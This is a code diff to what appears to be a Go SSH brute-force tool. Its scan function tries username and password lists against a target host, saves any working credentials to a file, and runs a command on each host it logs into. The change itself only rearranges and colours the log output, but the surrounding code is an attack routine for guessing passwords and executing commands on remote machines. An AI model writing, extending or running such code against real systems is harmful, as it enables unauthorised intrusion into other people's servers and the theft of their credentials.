@@ -162,20 +162,18 @@ func scan(ip string, port int) {
 		for _, password := range pwdList {
 			if isLogin, client := sshLogin(ip, port, username, password); isLogin {
 
-				fmt.Printf("[+][log] %s:%d %s %s\n", ip, port, username, password)
+				var line = fmt.Sprintf("%s:%d %s %s\n", ip, port, username, password)
+				f.WriteString(line)
+				fmt.Printf("[log] %s:%d \033[0;32m%s %s\033[0m\n", ip, port, username, password)
+
 				output, err := sshExec(client, command)
 				if err != nil {
 					fmt.Println("Failed to exec: " + err.Error())
 				}
-				fmt.Printf("[+][cmd] %s:%d %s", ip, port, output)
-
-				var line = fmt.Sprintf("%s:%d %s %s\n", ip, port, username, password)
-				f.WriteString(line)
-
+				fmt.Printf("[cmd] %s:%d \033[0;32m%s\033[0m", ip, port, output)
 				return
-
 			} else {
-				// fmt.Printf("[-] %s:%d %s %s\n", ip, port, username, password)
+				// fmt.Printf("[err] %s:%d %s %s\n", ip, port, username, password)
 			}
 		}
 	}
